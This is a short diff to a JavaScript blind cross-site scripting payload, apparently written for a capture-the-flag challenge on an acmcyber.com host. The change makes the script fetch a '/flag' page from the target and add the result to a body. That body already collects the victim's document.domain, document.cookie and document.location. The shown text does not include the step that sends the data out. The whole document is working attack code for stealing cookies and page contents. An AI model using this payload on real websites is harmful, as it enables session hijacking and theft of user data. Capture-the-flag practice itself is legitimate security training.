@@ -1,7 +1,8 @@
 const headers = new Headers()
 headers.append("Content-Type", "application/json")
 
-fetch('/flag')
+let flag = ""
+fetch('https://spiteful-xss.acmcyber.com/flag')
   .then(response => {
     if (response.ok) {
       return response.text();
@@ -11,6 +12,7 @@ fetch('/flag')
   })
   .then(data => {
     console.log(data);
+    flag = data;
   })
   .catch(error => {
     console.error('Error:', error);
@@ -20,7 +22,8 @@ const body = {
   "test": "Blind",
   "Domain": document.domain,
   "cookie": document.cookie,
-  "Location": document.location
+  "Location": document.location,
+  "flag":flag
   
 }
 
